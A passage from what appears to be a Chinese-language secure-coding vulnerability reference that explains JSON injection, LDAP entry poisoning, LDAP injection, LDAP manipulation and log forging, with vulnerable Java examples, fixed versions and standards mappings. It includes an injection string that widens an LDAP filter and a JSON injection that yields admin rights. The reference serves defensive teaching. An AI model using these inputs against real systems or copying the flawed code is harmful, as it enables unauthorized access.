(&quot;role&quot;.equals(fieldname)) &#123;</span><br><span class="line"></span><br><span class="line">    jParser.nextToken();</span><br><span class="line"></span><br><span class="line">    userInfo.put(fieldname, jParser.getText());</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if (userInfo.size() == 3)</span><br><span class="line"></span><br><span class="line">    break;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jParser.close();</span><br></pre></td></tr></table></figure>
<p>HashMap 对象中 username、password 和 role 密钥的最终值将分别为 mallory、Evil123! 和 admin。在没有进一步验证反序列化 JSON 值是否有效的情况下，应用程序会错误地为用户分配 mallory“管理员”特权。</p>
<h5 id="RECOMMENDATIONS-289"><a href="#RECOMMENDATIONS-289" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将用户提供的数据写入 JSON 时，应该遵守以下准则：</p>
<ol>
<li><p>不要创建名称来自用户输入的 JSON 属性。</p>
</li>
<li><p>确保使用安全的序列化函数（能够以单引号或双引号分隔不可信赖的数据，并且避免任何特殊字符）执行对 JSON 的所有序列化操作。</p>
</li>
</ol>
<p>例 2：以下 Java 代码实施了与例 1 相同的功能，但使用了 JsonGenerator.writeString() 代替 JsonGenerator.writeRawValue() 来对数据执行序列化操作，因此可以确保适当地分隔和避开任何不可信赖的数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">JsonFactory jfactory = new JsonFactory();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">JsonGenerator jGenerator = jfactory.createJsonGenerator(new File(&quot;~/user_info.json&quot;), JsonEncoding.UTF8);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.writeStartObject();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.writeFieldName(&quot;username&quot;);</span><br><span class="line"></span><br><span class="line">jGenerator.writeString(username);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.writeFieldName(&quot;password&quot;);</span><br><span class="line"></span><br><span class="line">jGenerator.writeString(password);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.writeFieldName(&quot;role&quot;);</span><br><span class="line"></span><br><span class="line">jGenerator.writeString(&quot;default&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.writeEndObject();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.close();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-288"><a href="#REFERENCES-288" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 91</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="LDAP-Entry-Poisoning"><a href="#LDAP-Entry-Poisoning" class="headerlink" title="LDAP Entry Poisoning"></a>LDAP Entry Poisoning</h4><h5 id="ABSTRACT-290"><a href="#ABSTRACT-290" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>执行对象返回 LDAP 搜索的应用程序会允许攻击者控制 LDAP 响应以在服务器上运行任意代码。</p>
<h5 id="EXPLANATION-291"><a href="#EXPLANATION-291" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>凡是能够通过随意修改条目或动态拦截和修改响应（中间人攻击）篡改 LDAP 响应的攻击者，都能够将特殊 Java 属性注入到 LDAP 条目中。当执行对象返回搜索时，会使用 Java 反序列化或 JNDI 间接引用来将 Java 属性解码为 Java 对象，这会使攻击者能够在执行搜索的应用程序服务器上远程执行代码。</p>
<p>应用程序通过在传递给 search 方法的 javax.naming.directory.SearchControls 实例上将 returningObjectFlag 设置为 true，或者通过使用代表自身设置此标签的库函数，来执行对象返回搜索。</p>
<p>在这种情况下，应用程序使用 Spring Security LDAP 身份验证模块，该模块执行对象返回搜索，因此很容易受到 LDAP 条目中毒攻击。</p>
<p>示例：下面的 Beans 配置文件对应用程序进行配置，以使用 Spring Security LDAP 模块作为身份验证提供者。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans ... &gt;</span><br><span class="line"></span><br><span class="line">	&lt;authentication-manager&gt;</span><br><span class="line"></span><br><span class="line">        &lt;ldap-authentication-provider</span><br><span class="line"></span><br><span class="line">            user-search-filter=&quot;(uid=&#123;0&#125;)&quot;</span><br><span class="line"></span><br><span class="line">            user-search-base=&quot;ou=users,dc=example,dc=org&quot;</span><br><span class="line"></span><br><span class="line">            group-search-filter=&quot;(uniqueMember=&#123;0&#125;)&quot;</span><br><span class="line"></span><br><span class="line">            group-search-base=&quot;ou=groups,dc=example,dc=org&quot;</span><br><span class="line"></span><br><span class="line">            group-role-attribute=&quot;cn&quot;</span><br><span class="line"></span><br><span class="line">            role-prefix=&quot;ROLE_&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/ldap-authentication-provider&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/authentication-manager&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-290"><a href="#RECOMMENDATIONS-290" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果不使用 LDAP 来存储 Java 对象，则不要仅仅为了获得代表结果条目的 DirContext 封装而执行对象返回搜索。请使用常规搜索获取属性。</p>
<p>在写入时，Spring Security 3.2.0 版之前的版本容易受到 LDAP 条目中毒攻击。没有安全的配置，因此请考虑使用其他库（例如 Apache Shiro）来执行 LDAP 身份验证。</p>
<h5 id="REFERENCES-289"><a href="#REFERENCES-289" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Introducing JNDI Injection and LDAP Entry Poisoning Micro Focus Fortify</p>
<p>[2] A Journey from JNDI/LDAP manipulation to remote code execution dream land BlackHat</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 20</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<h4 id="LDAP-Injection"><a href="#LDAP-Injection" class="headerlink" title="LDAP Injection"></a>LDAP Injection</h4><h5 id="ABSTRACT-291"><a href="#ABSTRACT-291" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>通过用户输入构造的动态 LDAP 筛选器允许攻击者修改指令的含义。</p>
<h5 id="EXPLANATION-292"><a href="#EXPLANATION-292" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>LDAP injection 错误在以下情况下出现： </p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>该数据用于动态构造一个 LDAP 筛选器。</p>
</li>
</ol>
<p>例 1：以下代码动态构造一个 LDAP 查询，并对其加以执行，该查询可以检索所有报告给指定经理的雇员记录。该经理的名字是从 HTTP 请求中读取的，因此不可信任。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">DirContext ctx = new InitialDirContext(env);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">String managerName = request.getParameter(&quot;managerName&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">//retrieve all of the employees who report to a manager</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">String filter = &quot;(manager=&quot; + managerName + &quot;)&quot;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">NamingEnumeration employees = ctx.search(&quot;ou=People,dc=example,dc=com&quot;,</span><br><span class="line"></span><br><span class="line">        			                 filter);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在正常情况下，诸如搜索向 John Smith 经理报告的雇员，该代码执行的筛选器如下：</p>
<p><code>(manager=Smith, John)</code></p>
<p>但是，由于筛选器是通过连接一个常数基本查询串和一个用户输入串动态构造而成的，因此，该查询只在 managerName 不包含任何 LDAP 元字符时才能正常运行。如果攻击者为 managerName 输入字符串 Hacker, Wiley)(|(objectclass=*)，则该查询会变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(manager=Hacker, Wiley)(|(objectclass=*))</span><br></pre></td></tr></table></figure>
<p>根据执行查询的权限，增加 |(objectclass=*) 条件会导致筛选器与目录中的所有输入都匹配，而且会使攻击者检索到有关用户输入池的信息。根据执行 LDAP 查询的权限大小，此次攻击的影响范围可能会有所差异，但是如果攻击者可以控制查询的命令结构，那么这样的攻击至少会影响执行 LDAP 查询的用户可以访问的所有记录。</p>
<h5 id="RECOMMENDATIONS-291"><a href="#RECOMMENDATIONS-291" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>LDAP injection 漏洞的根本原因是攻击者提供了可以改变 LDAP 查询含义的 LDAP 元字符。构造 LDAP 筛选器后，程序员会清楚哪些字符应作为命令解析，而哪些字符应作为数据解析。</p>
<p>为了防止攻击者侵犯程序员的各种预设情况，可以使用白名单的方法，确保 LDAP 查询中由用户控制的数值完全来自于预定的字符集合，不包含任何上下文中所已使用的 LDAP 元字符。如果由用户控制的数值范围要求它必须包含 LDAP 元字符，则使用相应的编码机制删除这些元字符在 LDAP 查询中的意义。</p>
<p>例 2：可以对上述例子进行重写。以便使用 Spring 框架 EqualsFilter 类来构造一个编码得当的筛选器字符串。不论请求参数中是否存在 LDAP 元字符，这一字符串都可以保护指令的命令结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">DirContext ctx = new InitialDirContext(env);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">String managerName = request.getParameter(&quot;managerName&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">//retrieve all of the employees who report to a manager</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">EqualsFilter filter = new EqualsFilter(&quot;manager&quot;, managerName);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">NamingEnumeration employees = ctx.search(&quot;ou=People,dc=example,dc=com&quot;,</span><br><span class="line"></span><br><span class="line">        			                 filter.toString());</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-290"><a href="#REFERENCES-290" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 90</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[5] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[18] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 LDAP Injection</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 LDAP Injection (WASC-29)</p>
<h4 id="LDAP-Manipulation"><a href="#LDAP-Manipulation" class="headerlink" title="LDAP Manipulation"></a>LDAP Manipulation</h4><h5 id="ABSTRACT-292"><a href="#ABSTRACT-292" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>执行一个 LDAP 指令，该指令包含了由用户控制的数值字符串，且使用滤字符串以外的字符，这可能会使攻击者改变指令的含义或执行非法 LDAP 命令。</p>
<h5 id="EXPLANATION-293"><a href="#EXPLANATION-293" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>LDAP manipulation 错误在以下情况中出现：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据在一个动态 LDAP 指令的滤字符串之外使用。</p>
</li>
</ol>
<p>例 1：以下代码从一个 HTTP 请求里读取用户名和密码，并且使用它去执行 LDAP 查询。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">env.put(Context.SECURITY_AUTHENTICATION, &quot;none&quot;);</span><br><span class="line"></span><br><span class="line">DirContext ctx = new InitialDirContext(env);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">String empID = request.getParameter(&quot;empID&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">try</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  BasicAttribute attr = new BasicAttribute(&quot;empID&quot;, empID);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NamingEnumeration employee =</span><br><span class="line"></span><br><span class="line">            ctx.search(&quot;ou=People,dc=example,dc=com&quot;,attr);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>因为该查询包含用户输入，且会在匿名绑定下执行，因此，该查询会返回所有指定用户名的详细信息，而不会考虑其密码是否与指定密码相匹配。攻击者可以有效使用以下代码查询系统中任意雇员的详细信息，这是一个严重的 privacy violation。问题在于开发人员没能充分利用适当的 access control 机制来限制查询，使查询只能读取那些允许当前用户读取的雇员记录。</p>
<h5 id="RECOMMENDATIONS-292"><a href="#RECOMMENDATIONS-292" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应用程序应该执行精确验证和通过绑定到具体的用户目录的方式来加强 access control 约束，而不是仅仅依赖于表示层来限制用户提交的值。在任何情况下，只要没有适当的权限，都不应该允许用户检索或修改目录中的相关记录。访问目录的每个查询应该执行该策略，这就意味着只有完全受限的查询在匿名绑定的情况下执行，从而有效避免了在 LDAP 系统上建立 access control 机制。</p>
<p>例 2：以下代码实现的功能与例 1 相同，但使用 LDAP 简单 authentication 来确保查询只影响到当前授权访问的用户记录，并以数字形式解析雇员 ID 来确保其不能包含任何 LDAP 元字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String employeePass = request.getParameter(&quot;userCred&quot;);</span><br><span class="line"></span><br><span class="line">String empID = request.getParameter(&quot;empID&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">env.put(Context.SECURITY_AUTHENTICATION, &quot;simple&quot;);</span><br><span class="line"></span><br><span class="line">env.put(Context.SECURITY_PRINCIPAL, &quot;cn=&quot;+empID);</span><br><span class="line"></span><br><span class="line">env.put(Context.SECURITY_CREDENTIALS, employeePass);</span><br><span class="line"></span><br><span class="line">DirContext ctx = new InitialDirContext(env);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">try</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  int id = Integer.parseInt(empID);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  BasicAttribute attr = new BasicAttribute(&quot;empID&quot;, empID);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NamingEnumeration employee =</span><br><span class="line"></span><br><span class="line">            ctx.search(&quot;ou=People,dc=example,dc=com&quot;,attr);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-291"><a href="#REFERENCES-291" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 90</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[5] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[14] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Abuse of Functionality (WASC-42)</p>
<h4 id="Log-Forging"><a href="#Log-Forging" class="headerlink" title="Log Forging"></a>Log Forging</h4><h5 id="ABSTRACT-293"><a href="#ABSTRACT-293" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将未经验证的用户输入写入日志文件可致使攻击者伪造日志条目或将恶意信息内容注入日志。</p>
<h5 id="EXPLANATION-294"><a href="#EXPLANATION-294" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在以下情况下会发生 Log Forging 的漏洞：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据写入到应用程序或系统日志文件中。</p>
</li>
</ol>
<p>为了便于以后的审阅、统计数据收集或调试，应用程序通常使用日志文件来储存事件或事务的历史记录。根据应用程序自身的特性，审阅日志文件可在必要时手动执行，也可以自动执行，即利用工具自动挑选日志中的重要事件或带有某种倾向性的信息。</p>
<p>如果攻击者可以向随后会被逐字记录到日志文件的应用程序提供数据，则可能会妨碍或误导日志文件的解读。最理想的情况是，攻击者可能通过向应用程序提供包括适当字符的输入，在日志文件中插入错误的条目。如果日志文件是自动处理的，那么攻击者就可以通过破坏文件格式或注入意外的字符，从而使文件无法使用。更阴险的攻击可能会导致日志文件中的统计信息发生偏差。通过伪造或其他方式，受到破坏的日志文件可用于掩护攻击者的跟踪轨迹，甚至还可以牵连第三方来执行恶意行为 [1]。最糟糕的情况是，攻击者可能向日志文件注入代码或者其他命令，利用日志处理实用程序中的漏洞 [2]。</p>
<p>例 1： 下列 Web 应用程序代码会尝试从一个请求对象中读取整数值。如果数值未被解析为整数，输入就会被记录到日志中，附带一条提示相关情况的错误消息。</p>
